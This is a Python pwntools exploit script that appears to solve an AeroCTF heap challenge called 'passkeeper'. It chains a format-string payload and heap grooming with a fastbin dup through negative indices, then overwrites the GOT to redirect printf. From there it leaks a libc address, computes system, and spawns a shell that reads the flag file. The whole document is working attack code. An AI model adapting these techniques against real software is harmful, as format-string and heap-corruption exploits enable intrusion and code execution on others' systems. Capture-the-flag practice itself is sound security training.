from pwn import *
import struct

context(os='linux', arch='amd64')
# context.log_level = 'debug'

BINARY = './passkeeper'
elf  = ELF(BINARY)

def Keep_password(password):
  s.sendlineafter("> ", "1")
  s.sendlineafter("{?} Enter password: ", password)

def View_password(id):
  s.sendlineafter("> ", "2")
  s.sendlineafter("{?} Enter password id: ", str(id))

def Delete_password(id):
  s.sendlineafter("> ", "4")
  s.sendlineafter("{?} Enter password id: ", str(id))

def View_profile():
  s.sendlineafter("> ", "6")

def Change_secret(secret):
  s.sendlineafter("> ", "7")
  s.sendlineafter("Enter new secret: ", secret)

for j in range(1000):
  print j
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "tasks.aeroctf.com"
    PORT = 33039
    s = remote(HOST, PORT)
    libc = ELF("./libc.so.6")
  else:
    #s = process(BINARY)
    s =  process(["./ld-linux-x86-64.so.2", BINARY], env={"LD_PRELOAD":"./libc.so.6"})
    # s = process(BINARY, env={'LD_PRELOAD': 'libc.so.6', 'LD_PRELOAD': 'ld-linux-x86-64.so.2'})
    libc = elf.libc

  s.recvuntil("{?} Enter name: ")
  buf = "/bin/sh-%28$s%230c%28$hhn\x00" + "A"*(0x39 - 26)
  s.sendline(buf)
  s.recvuntil("{?} Enter secret: ")
  s.sendline(p64(elf.got['setvbuf']))

  for i in range(15):
    Keep_password("A"*0x2f)

  for i in range(14, 5, -1):
    Delete_password(i)

  for i in range(7):
    Keep_password("B"*0x2f)

  for i in range(8, 0, -1):
    Delete_password(i)

  # fastbin dup into stack
  Delete_password(-136)
  
  try:
    Delete_password(0)
    Delete_password(-132)

    for i in range(7):
      Keep_password("C")

    Keep_password(p64(0x404100))
    Keep_password("C")
    Keep_password("D")
    Keep_password(p64(elf.plt['printf']))

    View_profile()
    s.recvuntil("/bin/sh-")
    r = s.recv(6)

    setvbuf_addr = u64(r + "\x00\x00") 
    libc_base   = setvbuf_addr - libc.symbols['setvbuf']
    system_addr = libc_base + libc.symbols['system']

    print "setvbuf_addr =", hex(setvbuf_addr)
    print "libc_base    =", hex(libc_base)
    print "system_addr  =", hex(system_addr)

    Change_secret(p64(0x4040c7))
    View_profile()

    Delete_password(12)
    Keep_password(p64(system_addr))
    View_profile()

    s.sendline("cat /tmp/flag.txt")

    s.interactive()
  except:
    s.close()
